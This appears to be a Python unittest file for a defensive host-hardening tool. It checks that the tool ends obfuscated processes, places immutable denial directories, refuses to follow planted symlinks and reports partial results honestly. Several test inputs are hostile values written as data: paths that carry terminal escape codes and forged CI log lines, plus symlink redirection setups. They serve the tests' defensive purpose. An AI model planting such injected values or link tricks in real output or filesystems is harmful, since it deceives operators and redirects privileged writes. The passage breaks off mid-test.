#!/usr/bin/env python3
"""Host-level denials: enforcing only after read-back; never remove what is already there."""
from __future__ import annotations

import os
import subprocess
import tempfile
import types
import unittest
from pathlib import Path
import contextlib
import pwd
from unittest import mock

from stayawake.bots.security import harden, hook, schedule
from stayawake.bots.security.harden import settings as editorsettings
from stayawake.bots.security.harden import live
from stayawake.bots.security.harden import denial
from stayawake.bots.security.hygiene import host_artifacts
from stayawake.bots.security.hygiene.models import HygieneIssue, PROCESSES_NOT_READABLE_ID
from stayawake.utils import hostdenial, operator


@contextlib.contextmanager
def locked(*paths: Path):
    """Make `paths` read back as immutable, without needing the OS to allow it.

    `chattr +i` needs a capability CI does not have, and those filesystems often cannot carry the
    flag at all. The flag itself is covered separately, where it can be set.
    """
    held = {Path(p).resolve() for p in paths}
    with mock.patch.object(hostdenial, "immutable", lambda p: Path(p).resolve() in held), \
         mock.patch.object(hostdenial, "set_immutable",
                           lambda p: bool(held.add(Path(p).resolve()) or True)), \
         mock.patch.object(hostdenial, "clear_immutable",
                           lambda p: bool(held.discard(Path(p).resolve()) or True)):
        yield held


def _issue(id_):
    return HygieneIssue(id=id_, severity="unknown", title=id_, detail=id_, remediation="x")


def _hooks_already_there():
    """Settling that changes nothing, for every test that is not about the hooks."""
    class _InPlace:
        state = hook.IN_PLACE
    return hook.Settling(actions=[_InPlace()], target="/template")

class ReachedTheRealMachine(BaseException):
    """Raised when a test reaches this machine itself.

    TRAP: not an `Exception`. Both callers guard their collaborators with `except Exception` so one
    bad part never takes the command down, and that swallows an ordinary assertion — the canary
    then prevents the damage while the test still passes.
    """


def _never(*args, **kwargs):
    """Fail the test rather than reach this machine's own service manager."""
    raise ReachedTheRealMachine(f"the real service manager: {args[0] if args else kwargs}")


def _never_writes(where, *args, **kwargs):
    """Fail the test rather than write to a file this machine's editor reads."""
    raise ReachedTheRealMachine(f"a real editor's settings: {where}")


def _EDITORS_OK():
    """An editor pass that changed nothing, for every test that is not about editor settings."""
    return editorsettings.Correcting()


def _EDITORS_BACK():
    """Putting editor settings back, having nothing to put back."""
    return editorsettings.TakingBack()


def _editor_settings_now():
    """Every real editor settings file on this machine, with its size and last change."""
    from stayawake.bots.security.hygiene import editors
    out = {}
    for found in editors.installed().editors:
        try:
            st = found.settings.stat()
            out[str(found.settings)] = (st.st_size, st.st_mtime_ns)
        except OSError:
            pass
    return out


_NO_MANAGER = mock.patch.object(
    schedule, "subprocess",
    types.SimpleNamespace(run=_never, SubprocessError=subprocess.SubprocessError))

_NO_EDITOR_WRITE = mock.patch.object(
    editorsettings, "atomicwrite", types.SimpleNamespace(replace=_never_writes))

_ITEM_BEFORE = False
_EDITORS_BEFORE = {}


def setUpModule():
    """Cut this module off from the machine's own service manager and login item."""
    global _ITEM_BEFORE, _EDITORS_BEFORE
    _ITEM_BEFORE = schedule.item_path().exists()
    _EDITORS_BEFORE = _editor_settings_now()
    _NO_MANAGER.start()
    _NO_EDITOR_WRITE.start()


def tearDownModule():
    """Nothing here may place a login item, or register a job, on the machine running the suite.

    Two canaries because they see different things. A registration is not a file, so the filesystem
    check below is blind to it; a `**kwargs` spread is not visible to the static guard either.
    """
    _NO_MANAGER.stop()
    _NO_EDITOR_WRITE.stop()
    changed = [p for p, was in _editor_settings_now().items() if _EDITORS_BEFORE.get(p) != was]
    if changed:
        raise AssertionError(f"a test in this module changed a real editor's settings: {changed}")
    if schedule.item_path().exists() and not _ITEM_BEFORE:
        where = schedule.item_path()
        where.unlink(missing_ok=True)
        raise AssertionError(f"a test in this module placed {where.name} on this machine")


class TestRunContract(unittest.TestCase):
    def test_not_implemented_is_not_success(self):
        code, text = harden.run(editor_pass=_EDITORS_OK, supported=lambda: False, live=lambda: [], settle_hooks=_hooks_already_there, stop=lambda: None, apply=lambda p: harden.PathOutcome(harden.NOT_HERE_YET, p, ''), schedule_pass=lambda: None)
        self.assertEqual(code, 2)
        self.assertIn("not implemented", text.lower())

    def test_an_altered_saw_hook_is_named_and_left_to_the_repair_verb(self):
        mine = Path("/mine")
        # A spread cannot be judged from the syntax, so the guard skips these calls — which is
        # exactly how a login item reached a real machine. Everything that acts is in here.
        kwargs = dict(supported=lambda: True, live=lambda: [], folders=lambda: [mine],
                      stop=lambda: None, schedule_pass=lambda: None,
                      apply=lambda p: denial.PathOutcome(p, denial.ENFORCING, "in place"))
        code, text = harden.run(editor_pass=_EDITORS_OK, altered=lambda: [Path("/home/op/.config/saw/git-template/hooks/post-merge")],
                                **kwargs, settle_hooks=_hooks_already_there)
        self.assertEqual(code, 0)
        self.assertIn("saw hook repair", text)
        self.assertNotIn("/home/op", text, "a path was printed")
        code, text = harden.run(editor_pass=_EDITORS_OK, altered=lambda: [], **kwargs, settle_hooks=_hooks_already_there)
        self.assertNotIn("saw hook repair", text)
        code, text = harden.run(editor_pass=_EDITORS_OK, altered=lambda: [Path("/home/op/x\n  enforcing: /forged\x1b[32m")], **kwargs, settle_hooks=_hooks_already_there)
        self.assertNotIn("\n  enforcing: /forged", text)
        self.assertNotIn("\x1b", text)
        code, text = harden.run(editor_pass=_EDITORS_OK, altered=lambda: [], saw_runs=lambda: False, **kwargs, settle_hooks=_hooks_already_there)
        self.assertIn("saw hook repair", text)
        self.assertIn("cannot run", text)
        code, text = harden.run(editor_pass=_EDITORS_OK, altered=lambda: [], saw_runs=lambda: True, **kwargs, settle_hooks=_hooks_already_there)
        self.assertNotIn("cannot run", text)

    def test_without_root_it_still_takes_what_it_can(self):
        """Root is asked of the PATH, not of the command. Refusing the whole run because one
        location needs privilege withheld a control from everyone unwilling to give a security
        tool root — and the locations that need it are named rather than skipped in silence."""
        mine, theirs = Path("/mine"), Path("/theirs")
        code, text = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, live=lambda: [],
            folders=lambda: [mine, theirs],
            apply=lambda p: denial.PathOutcome(p, denial.SELF_ENFORCING, "in place")
            if p == mine else denial.PathOutcome(p, denial.NEEDS_ROOT, "not yours to write to"), settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        # Both facts point at the same action, so the run states the action once rather than
        # explaining each location — which is what made the report unreadable.
        self.assertIn("Run again with sudo", text)
        self.assertIn("sudo", text)
        self.assertNotEqual(code, 0, "a location it could not take is not a complete result")

    def test_live_code_is_ended_and_then_the_control_is_applied(self):
        # This used to refuse, which meant the more compromised the host, the less this command
        # did — and the control it declined to place is the one that stops re-infection.
        ended = live.Ending(matched=3, frozen=3, ended=3, quiet=True, still_holding=0)
        mine = Path("/mine")
        code, text = harden.run(editor_pass=_EDITORS_OK, supported=lambda: True, folders=lambda: [mine],
                                apply=lambda p: denial.PathOutcome(p, denial.ENFORCING, "held"),
                                live=lambda: [_issue("live-obfuscated-process")],
                                stop=lambda: ended, settle_hooks=_hooks_already_there, schedule_pass=lambda: None)
        self.assertEqual(code, 0)
        self.assertIn("It has been stopped", text)
        self.assertIn("This machine is protected", text)

    def test_what_it_could_not_end_does_not_cost_the_controls_it_could_place(self):
        # Withholding here was the same inversion as refusing to act at all: the worse the machine,
        # the less the command did, and these controls are what stops the next re-infection.
        alive = live.Ending(matched=4, frozen=4, ended=3, survived=[91], quiet=True,
                            still_holding=1)
        apply = mock.Mock(return_value=denial.PathOutcome(Path("/mine"), denial.ENFORCING, "held"))
        code, text = harden.run(editor_pass=_EDITORS_OK, supported=lambda: True, folders=lambda: [Path("/mine")],
                                apply=apply, live=lambda: [_issue("live-obfuscated-process")],
                                stop=lambda: alive, settle_hooks=_hooks_already_there, schedule_pass=lambda: None)
        apply.assert_called_once()
        self.assertEqual(code, 1, "an unresolved process must still fail the run")
        self.assertIn("not all of it could be stopped", text)
        self.assertIn("not all of it could be stopped", text)

    def test_a_source_it_cannot_see_is_named_rather_than_implied(self):
        spawning = live.Ending(matched=9, frozen=9, ended=9, quiet=False, still_holding=2)
        code, text = harden.run(editor_pass=_EDITORS_OK, supported=lambda: True, folders=lambda: [Path("/mine")],
                                apply=lambda p: denial.PathOutcome(p, denial.ENFORCING, "held"),
                                live=lambda: [_issue("live-obfuscated-process")],
                                stop=lambda: spawning, settle_hooks=_hooks_already_there, schedule_pass=lambda: None)
        self.assertEqual(code, 1)
        self.assertIn("starting again by itself", text)

    def test_privilege_it_could_not_get_is_named_as_an_ask_that_failed(self):
        # It no longer reports another user's process and walks away: it asks, for those processes
        # only, and says so when the answer does not come.
        theirs = live.Ending(matched=2, frozen=0, ended=0, refused=[404], asked_for=[404],
                             asking="cannot-ask", quiet=True, still_holding=2)
        code, text = harden.run(editor_pass=_EDITORS_OK, supported=lambda: True, folders=lambda: [Path("/mine")],
                                apply=lambda p: denial.PathOutcome(p, denial.ENFORCING, "held"),
                                live=lambda: [_issue("live-obfuscated-process")],
                                stop=lambda: theirs, settle_hooks=_hooks_already_there, schedule_pass=lambda: None)
        self.assertEqual(code, 1)
        self.assertIn("Run again with sudo", text)
        self.assertIn("Run again with sudo", text)
        self.assertIn("Run again with sudo", text)

    def test_privilege_nobody_can_grant_costs_only_what_needed_it(self):
        # The whole point: a part that needs a password nobody can answer must not cost the
        # operator every control this run was able to place.
        theirs = live.Ending(matched=3, frozen=2, ended=2, refused=[404], asked_for=[404],
                             asking="cannot-ask", quiet=True, still_holding=1)
        placed = []
        code, text = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, folders=lambda: [Path("/one"), Path("/two")],
            apply=lambda p: placed.append(p) or denial.PathOutcome(p, denial.ENFORCING, "held"),
            live=lambda: [_issue("live-obfuscated-process")], stop=lambda: theirs, settle_hooks=_hooks_already_there, schedule_pass=lambda: None)
        self.assertEqual(placed, [Path("/one"), Path("/two")], "it skipped the controls it could place")
        self.assertEqual(code, 1, "the part it could not do must still fail the run")
        self.assertIn("not all of it could be stopped", text)

    def test_privilege_that_was_granted_ends_it_and_the_control_goes_on(self):
        granted = live.Ending(matched=2, frozen=1, ended=2, asked_for=[404], asking="granted",
                              quiet=True, still_holding=0)
        code, text = harden.run(editor_pass=_EDITORS_OK, supported=lambda: True, folders=lambda: [Path("/mine")],
                                apply=lambda p: denial.PathOutcome(p, denial.ENFORCING, "held"),
                                live=lambda: [_issue("live-obfuscated-process")],
                                stop=lambda: granted, settle_hooks=_hooks_already_there, schedule_pass=lambda: None)
        self.assertEqual(code, 0)
        self.assertIn("It has been stopped", text)
        self.assertIn("It has been stopped", text)

    def test_a_probe_that_raises_does_not_take_the_command_down(self):
        def boom():
            raise OSError("kernel refused the process table")
        code, text = harden.run(editor_pass=_EDITORS_OK, supported=lambda: True, folders=lambda: [], apply=lambda p: None,
                                live=boom, settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertEqual(code, 1)
        self.assertIn("could not be examined", text.lower())
        self.assertIn("OSError", text)

    def test_what_was_ended_is_one_line_however_many_there_were(self):
        # A measured run produced 135 near-identical 300-character lines. A wall nobody can read
        # is not a report, and this is the case where reading it matters most.
        many = live.Ending(matched=135, frozen=135, ended=135, quiet=True, still_holding=0,
                           captured="/state/saw/captured/live-code.json")
        _code, text = harden.run(editor_pass=_EDITORS_OK, supported=lambda: True, folders=lambda: [Path("/mine")],
                                 apply=lambda p: denial.PathOutcome(p, denial.ENFORCING, "held"),
                                 live=lambda: [_issue("live-obfuscated-process")],
                                 stop=lambda: many, settle_hooks=_hooks_already_there, schedule_pass=lambda: None)
        self.assertIn("It has been stopped", text)
        self.assertIn("It has been stopped", text)
        self.assertLess(len(text.splitlines()), 15, "the report grew with the population again")

    def test_a_captured_path_cannot_control_the_terminal(self):
        hostile = live.Ending(matched=1, frozen=1, ended=0, survived=[7], quiet=True,
                              still_holding=1,
                              captured="/tmp/\x1b[2K\r##[error]saw: all clear")
        _code, text = harden.run(editor_pass=_EDITORS_OK, supported=lambda: True, folders=lambda: [], apply=lambda p: None,
                                 live=lambda: [_issue("live-obfuscated-process")],
                                 stop=lambda: hostile, settle_hooks=_hooks_already_there, schedule_pass=lambda: None)
        self.assertNotIn("\x1b", text)
        self.assertNotIn("\r", text)
        self.assertNotIn("##[", text)

    def test_unreadable_processes_are_refused(self):
        code, text = harden.run(editor_pass=_EDITORS_OK, supported=lambda: True, folders=lambda: [], apply=lambda p: None,
                                live=lambda: [_issue(PROCESSES_NOT_READABLE_ID)], settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertEqual(code, 1)
        self.assertIn("could not be examined", text.lower())

    def test_an_unexamined_table_is_refused(self):
        from stayawake.bots.security.hygiene import process
        from stayawake.utils.procsnap import Snapshot
        apply = mock.Mock()
        with mock.patch.object(process, "_snapshot", return_value=Snapshot()):
            code, text = harden.run(editor_pass=_EDITORS_OK, 
                supported=lambda: True, live=process.check_live_processes,
                folders=lambda: [Path("/denial")], apply=apply, settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertEqual(code, 1)
        self.assertIn("could not be examined", text.lower())
        apply.assert_not_called()

    def test_unread_arguments_on_an_examined_table_do_not_refuse(self):
        from stayawake.bots.security.hygiene import process
        from stayawake.utils.procsnap import Process, Snapshot
        p = Path("/denial")
        snap = Snapshot(processes=[Process(pid=1, argv_unreadable=True)], unreadable=1)
        with mock.patch.object(process, "_snapshot", return_value=snap):
            code, _ = harden.run(editor_pass=_EDITORS_OK, 
                supported=lambda: True, live=process.check_live_processes,
                folders=lambda: [p],
                apply=lambda path: denial.PathOutcome(path, denial.ENFORCING, "in place"), settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertEqual(code, 0)

    def test_a_run_that_denied_nothing_does_not_claim_it_did(self):
        p = Path("/usr/local/lib/node")
        code, text = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, live=lambda: [],
            folders=lambda: [p],
            apply=lambda path: denial.PathOutcome(path, denial.OCCUPIED,
                                                  "already had something in it, so it was not changed"), settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertEqual(code, 3)
        self.assertNotIn("is denied", text)
        self.assertIn("not fully protected", text)
        self.assertNotEqual(code, 0)
        self.assertIn("not fully protected", text)

    def test_one_denied_among_untouched_does_not_claim_the_host(self):
        a, b = Path("/a"), Path("/b")
        def apply(path):
            if path == a:
                return denial.PathOutcome(path, denial.ENFORCING, "in place")
            return denial.PathOutcome(path, denial.OCCUPIED,
                                      "already had something in it, so it was not changed")
        code, text = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, live=lambda: [],
            folders=lambda: [a, b], apply=apply, settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertEqual(code, 3)
        self.assertNotIn("is denied", text)
        self.assertIn("not fully protected", text)

    def test_enforcing_only_when_every_target_reads_back(self):
        p = Path("/denial")
        code, text = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, live=lambda: [],
            folders=lambda: [p],
            apply=lambda path: denial.PathOutcome(path, denial.ENFORCING, "in place"), settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertEqual(code, 0)
        self.assertIn("This machine is protected", text)
        self.assertIn("This machine is protected", text)
        self.assertNotIn("prevent", text.lower())

    def test_a_write_that_is_not_read_back_is_unknown_never_success(self):
        p = Path("/denial")
        code, text = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, live=lambda: [],
            folders=lambda: [p],
            apply=lambda path: denial.PathOutcome(path, denial.UNKNOWN, "could not be verified"), settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertEqual(code, 3)
        self.assertIn("not fully protected", text)
        self.assertNotIn("enforcing", text.split("\n")[0])

    def test_occupied_is_not_success_and_names_that_it_was_not_changed(self):
        p = Path("/denial")
        code, text = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, live=lambda: [],
            folders=lambda: [p],
            apply=lambda path: denial.PathOutcome(path, denial.OCCUPIED,
                                                  "already had something in it, so it was not changed"), settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertEqual(code, 3)
        self.assertIn("not fully protected", text)

    def test_one_occupied_among_enforcing_is_not_success(self):
        a, b = Path("/a"), Path("/b")
        def apply(path):
            if path == a:
                return denial.PathOutcome(path, denial.ENFORCING, "in place")
            return denial.PathOutcome(path, denial.OCCUPIED,
                                      "already had something in it, so it was not changed")
        code, _ = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, live=lambda: [],
            folders=lambda: [a, b], apply=apply, settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertEqual(code, 3)

    def test_no_targets_is_not_success(self):
        code, _ = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, live=lambda: [],
            folders=lambda: [], apply=lambda p: None, settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertEqual(code, 3)

    def test_every_target_is_applied(self):
        seen = []
        paths = [Path("/a"), Path("/b"), Path("/c")]
        def apply(path):
            seen.append(path)
            return denial.PathOutcome(path, denial.ENFORCING, "in place")
        code, _ = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, live=lambda: [],
            folders=lambda: paths, apply=apply, settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertEqual(code, 0)
        self.assertEqual(seen, paths)

    def test_the_targets_are_the_same_list_the_audit_uses(self):
        from stayawake.bots.security.hygiene.host_artifacts import _global_folders
        self.assertIs(harden.run.__kwdefaults__["folders"], _global_folders)

    def test_other_live_findings_do_not_refuse(self):
        p = Path("/denial")
        code, _ = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, live=lambda: [_issue("some-other-hygiene")],
            folders=lambda: [p],
            apply=lambda path: denial.PathOutcome(path, denial.ENFORCING, "in place"), settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertEqual(code, 0)

    def test_it_ends_the_live_code_before_it_writes_anything(self):
        # `stop` is ALWAYS injected here. A test that leaves it defaulted signals real processes on
        # the machine running the suite.
        order = []
        apply = mock.Mock(side_effect=lambda p: order.append("write") or
                          denial.PathOutcome(p, denial.ENFORCING, "in place"))
        code, _text = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, live=lambda: [_issue("live-obfuscated-process")],
            folders=lambda: [Path("/denial")], apply=apply,
            stop=lambda: order.append("end") or live.Ending(matched=2, frozen=2, ended=2,
                                                            quiet=True, still_holding=0), settle_hooks=_hooks_already_there, schedule_pass=lambda: None)
        self.assertEqual(code, 0)
        self.assertEqual(order, ["end", "write"], "it wrote before the live code was ended")

    def test_without_root_it_does_write(self):
        """The inverse of what this used to pin: the run no longer stops before trying."""
        apply = mock.Mock(return_value=denial.PathOutcome(Path("/denial"),
                                                          denial.SELF_ENFORCING, "in place"))
        harden.run(editor_pass=_EDITORS_OK, supported=lambda: True, live=lambda: [],
                   folders=lambda: [Path("/denial")], apply=apply, settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        apply.assert_called_once()

    def test_a_failed_ending_still_places_the_control_and_still_fails_the_run(self):
        apply = mock.Mock(return_value=denial.PathOutcome(Path("/denial"), denial.ENFORCING, "held"))
        code, _text = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, live=lambda: [_issue("live-obfuscated-process")],
            folders=lambda: [Path("/denial")], apply=apply,
            stop=lambda: live.Ending(matched=2, frozen=2, ended=1, survived=[9], quiet=True,
                                     still_holding=1), settle_hooks=_hooks_already_there, schedule_pass=lambda: None)
        self.assertEqual(code, 1)
        apply.assert_called_once()

    def test_an_ending_that_raises_is_a_report_and_the_rest_still_runs(self):
        apply = mock.Mock(return_value=denial.PathOutcome(Path("/denial"), denial.ENFORCING, "held"))
        def boom():
            raise RuntimeError("the grader blew up on attacker-chosen text")
        code, text = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, live=lambda: [_issue("live-obfuscated-process")],
            folders=lambda: [Path("/denial")], apply=apply, stop=boom, settle_hooks=_hooks_already_there, schedule_pass=lambda: None)
        self.assertEqual(code, 1)
        self.assertIn("not all of it could be stopped", text)
        apply.assert_called_once()

    def test_an_implant_that_had_already_gone_does_not_withhold_the_control(self):
        # It exited between one look and the next. Saying "0 of 0 ended" and withholding the
        # control is a false statement about a machine with nothing left running on it.
        code, text = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, live=lambda: [_issue("live-obfuscated-process")],
            folders=lambda: [Path("/mine")],
            apply=lambda p: denial.PathOutcome(p, denial.ENFORCING, "in place"),
            stop=lambda: live.Ending(matched=0, quiet=True, still_holding=0), settle_hooks=_hooks_already_there, schedule_pass=lambda: None)
        self.assertEqual(code, 0)
        self.assertIn("This machine is protected", text)

    def test_a_self_held_result_is_never_reported_as_root_held(self):
        code, text = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, live=lambda: [],
            folders=lambda: [Path("/mine")],
            apply=lambda p: denial.PathOutcome(p, denial.SELF_ENFORCING, "in place"), settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)
        self.assertIn("you can undo it yourself", text)
        self.assertIn("you can undo it yourself", text)
        self.assertNotIn("only root can remove it", text)
        self.assertEqual(code, 0, "it took every location it was given")


class TestApplyOne(unittest.TestCase):
    def setUp(self):
        self.d = Path(tempfile.mkdtemp(prefix="harden-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.d, ignore_errors=True))

    def test_occupied_path_is_left_alone(self):
        target = self.d / "taken"
        target.mkdir()
        (target / "payload").write_text("x")
        with mock.patch.object(hostdenial, "holds", return_value=False):
            out = denial.apply_one(target)
        self.assertEqual(out.state, denial.OCCUPIED)
        self.assertTrue((target / "payload").exists())

    def test_file_at_the_path_is_not_removed(self):
        target = self.d / "file"
        target.write_text("x")
        with mock.patch.object(hostdenial, "holds", return_value=False):
            out = denial.apply_one(target)
        self.assertEqual(out.state, denial.OCCUPIED)
        self.assertTrue(target.is_file())

    def test_symlink_at_the_path_is_not_followed(self):
        target = self.d / "link"
        target.symlink_to(self.d / "elsewhere")
        with mock.patch.object(hostdenial, "holds", return_value=False):
            out = denial.apply_one(target)
        self.assertEqual(out.state, denial.OCCUPIED)
        self.assertTrue(target.is_symlink())

    def test_unverified_flag_is_unknown(self):
        target = self.d / "empty"
        target.mkdir()
        with mock.patch.object(hostdenial, "holds", return_value=False), \
             mock.patch.object(hostdenial, "empty_dir", return_value=True), \
             mock.patch("stayawake.bots.security.harden.denial.os.chmod"), \
             mock.patch("stayawake.bots.security.harden.denial.os.chown"), \
             mock.patch.object(hostdenial, "set_immutable", return_value=True):
            out = denial.apply_one(target)
        self.assertEqual(out.state, denial.UNKNOWN)

    def test_already_holding_is_enforcing_without_rewriting(self):
        target = self.d / "empty"
        target.mkdir()
        with mock.patch.object(hostdenial, "held_by", return_value=hostdenial.ROOT_HELD), \
             mock.patch.object(hostdenial, "set_immutable") as setter:
            out = denial.apply_one(target)
        setter.assert_not_called()
        self.assertEqual(out.state, denial.ENFORCING)

    def test_a_flag_that_did_not_take_is_unknown(self):
        target = self.d / "empty"
        target.mkdir()
        with mock.patch.object(hostdenial, "holds", side_effect=[False, True]), \
             mock.patch.object(hostdenial, "empty_dir", return_value=True), \
             mock.patch("stayawake.bots.security.harden.denial.os.chmod"), \
             mock.patch("stayawake.bots.security.harden.denial.os.chown"), \
             mock.patch.object(hostdenial, "set_immutable", return_value=False):
            out = denial.apply_one(target)
        self.assertEqual(out.state, denial.UNKNOWN)

    def test_a_write_error_is_unknown(self):
        target = self.d / "empty"
        target.mkdir()
        with mock.patch.object(hostdenial, "holds", return_value=False), \
             mock.patch.object(hostdenial, "empty_dir", return_value=True), \
             mock.patch("stayawake.bots.security.harden.denial.os.chmod",
                        side_effect=OSError):
            out = denial.apply_one(target)
        self.assertEqual(out.state, denial.UNKNOWN)

    def test_writes_do_not_follow_a_symlink(self):
        victim = self.d / "victim"
        victim.write_text("x")
        os.chmod(victim, 0o644)
        target = self.d / "staging"
        target.symlink_to(victim)
        dir_st = mock.Mock()
        dir_st.st_mode = __import__("stat").S_IFDIR | 0o755
        real_lstat = Path.lstat
        def lstat(self_path):
            if getattr(lstat, "once", True):
                lstat.once = False
                return dir_st
            return real_lstat(self_path)
        with mock.patch.object(hostdenial, "held_by", return_value=None), \
             mock.patch.object(Path, "lstat", lstat), \
             mock.patch.object(hostdenial, "empty_dir", return_value=True):
            denial.apply_one(target)
        self.assertEqual(victim.stat().st_mode & 0o777, 0o644)

    def test_does_not_freeze_a_directory_that_gained_children(self):
        """`0o555` denies the write to the OWNER too, so "it was not changed" left the operator
        unable to remove the file they were being told to look at."""
        target = self.d / "empty"
        target.mkdir()
        (target / "payload").write_text("x")
        seen = []

        def empty_until_the_write(_p):
            seen.append(None)
            return len(seen) == 1          # the arrival lands in the window, as it really would

        with mock.patch.object(hostdenial, "holds", return_value=False), \
             mock.patch.object(hostdenial, "empty_dir", empty_until_the_write), \
             mock.patch("stayawake.bots.security.harden.denial.os.chmod"), \
             mock.patch("stayawake.bots.security.harden.denial.os.chown"), \
             mock.patch.object(hostdenial, "set_immutable") as setter:
            out = denial.apply_one(target)
        setter.assert_not_called()
        self.assertEqual(out.state, denial.LEFT_OPEN_OVER_CONTENT)
        self.assertNotIn("not changed", out.detail)
        self.assertTrue((target / "payload").exists())

    def test_a_location_it_could_not_finish_is_left_usable(self):
        target = self.d / "fresh"
        with locked(), mock.patch.object(hostdenial, "holds", return_value=False), \
             mock.patch.object(hostdenial, "set_immutable", return_value=False):
            out = denial.apply_one(target)
        self.assertEqual(out.state, denial.UNKNOWN)
        self.assertTrue(os.access(target, os.W_OK | os.X_OK),
                        "the operator can still open and clear what this run created")

    def test_a_linked_parent_is_not_created_through(self):
        victim = self.d / "victim"
        victim.mkdir()
        (victim / "KEEPME").write_text("x")
        parent = self.d / "parent"
        parent.symlink_to(victim)
        target = parent / "denial"
        with mock.patch.object(hostdenial, "held_by", return_value=None):
            out = denial.apply_one(target)
        self.assertEqual(out.state, denial.UNKNOWN)
        self.assertFalse((victim / "denial").exists())
        self.assertEqual({p.name for p in victim.iterdir()}, {"KEEPME"})

    def test_a_linked_ancestor_is_not_created_through(self):
        victim = self.d / "victim"
        victim.mkdir()
        prefix = self.d / "prefix"
        prefix.symlink_to(victim)
        target = prefix / "lib" / "node"
        with mock.patch.object(hostdenial, "held_by", return_value=None):
            out = denial.apply_one(target)
        # Nothing is created above the leaf now, so this stops before the link is walked at all —
        # the victim staying empty is the property, and it holds for a stronger reason.
        self.assertEqual(out.state, denial.NOT_HERE_YET)
        self.assertEqual(list(victim.iterdir()), [])

    def test_a_root_owned_system_link_is_still_created_under(self):
        victim = self.d / "real"
        victim.mkdir()
        parent = self.d / "link"
        parent.symlink_to(victim)
        target = parent / "denial"
        link_st = parent.lstat()
        root_owned = mock.Mock()
        root_owned.st_mode = link_st.st_mode
        root_owned.st_uid = 0
        real_lstat = Path.lstat
        def lstat(self_path):
            if self_path == parent:
                return root_owned
            return real_lstat(self_path)
        with mock.patch.object(hostdenial, "held_by", return_value=None), \
             mock.patch.object(Path, "lstat", lstat), \
             mock.patch("stayawake.bots.security.harden.denial.os.chown"), \
             mock.patch.object(hostdenial, "set_immutable", return_value=False):
            out = denial.apply_one(target)
        self.assertEqual(out.state, denial.UNKNOWN)
        self.assertTrue((victim / "denial").is_dir())

    def test_a_missing_leaf_under_a_real_directory_is_created(self):
        (self.d / "lib").mkdir()
        target = self.d / "lib" / "node_modules"
        with mock.patch.object(hostdenial, "holds", return_value=False), \
             mock.patch("stayawake.bots.security.harden.denial.os.chown"), \
             mock.patch.object(hostdenial, "set_immutable", return_value=False):
            out = denial.apply_one(target)
        self.assertEqual(out.state, denial.UNKNOWN)
        self.assertTrue(target.is_dir())
        self.assertFalse(target.is_symlink())

    def test_mode_writes_pass_follow_symlinks_false(self):
        """With privilege, because taking ownership is the step that reaches `chown` — the write
        of the owner is exactly the one a planted link would redirect."""
        target = self.d / "empty"
        target.mkdir()
        with mock.patch.object(hostdenial, "held_by", return_value=None), \
             mock.patch.object(hostdenial, "privileged", return_value=True), \
             mock.patch.object(hostdenial, "empty_dir", return_value=True), \
             mock.patch("stayawake.bots.security.harden.denial.os.chmod") as chmod, \
             mock.patch("stayawake.bots.security.harden.denial.os.chown") as chown, \
             mock.patch.object(hostdenial, "set_immutable", return_value=False):
            denial.apply_one(target)
        self.assertTrue(chmod.called)
        self.assertFalse(chmod.call_args.kwargs.get("follow_symlinks", True))
        self.assertTrue(chown.called)
        self.assertFalse(chown.call_args.kwargs.get("follow_symlinks", True))


class TestAuditDoesNotTreatADenialAsADrop(unittest.TestCase):
    def test_a_holding_path_is_not_a_weak_indicator(self):
        from stayawake.bots.security.hygiene import host_artifacts
        fake = Path(tempfile.mkdtemp(prefix="holding-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(fake, ignore_errors=True))
        with mock.patch.object(host_artifacts, "_global_folders", return_value=[fake]), \
             mock.patch.object(hostdenial, "held_by", return_value=hostdenial.ROOT_HELD), \
             mock.patch.object(host_artifacts, "_host_user_tag", return_value=None), \
             mock.patch.object(host_artifacts, "_sideloaded_python_dir", lambda *_a, **_k: None), \
             mock.patch.object(host_artifacts, "_staged_secret_scanner", lambda *_a, **_k: None), \
             mock.patch.object(host_artifacts, "_distinct_dirs", lambda paths: []):
            strong, weak, unread, _controlled = host_artifacts._host_artifacts()
        self.assertEqual(strong, [])
        self.assertEqual(weak, [])
        self.assertEqual(unread, [])

    def test_a_tree_that_does_not_hold_is_still_reported(self):
        from stayawake.bots.security.hygiene import host_artifacts
        fake = Path(tempfile.mkdtemp(prefix="drop-"))
        (fake / "pkg").mkdir()
